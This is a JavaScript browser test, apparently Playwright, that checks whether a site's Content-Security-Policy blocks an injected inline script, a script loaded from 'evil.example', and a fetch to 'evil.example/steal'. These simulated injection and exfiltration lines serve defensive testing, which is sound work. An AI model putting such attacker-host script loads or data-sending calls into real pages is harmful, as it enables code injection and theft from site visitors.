// When the site is served WITH its security headers, an injected inline script, outside script and outside connection must all be blocked
import { BASE, launch } from './lib.mjs';
const head = await fetch(BASE, { method: 'HEAD' }); if (!head.headers.get('content-security-policy')) { console.log('SKIP: this server sends no Content-Security-Policy (dev server). Serve the production build with public/_headers or deploy/nginx to run this check.'); process.exit(0); }
const browser = await launch(); const page = await (await browser.newContext()).newPage(); const viol = [];
page.on('console', (m) => { if (/Content Security Policy|Refused to/.test(m.text())) viol.push(m.text()); });
await page.goto(BASE); await page.waitForTimeout(1200);
await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__injected = true'; document.body.appendChild(s); const o = document.createElement('script'); o.src = 'https://evil.example/x.js'; document.body.appendChild(o); fetch('https://evil.example/steal').catch(() => {}); });
await page.waitForTimeout(800);
const ran = await page.evaluate(() => !!window.__injected); console.log(`inline script ran: ${ran}; violations reported: ${viol.length}`);
await browser.close(); process.exit(!ran && viol.length >= 3 ? 0 : 1);
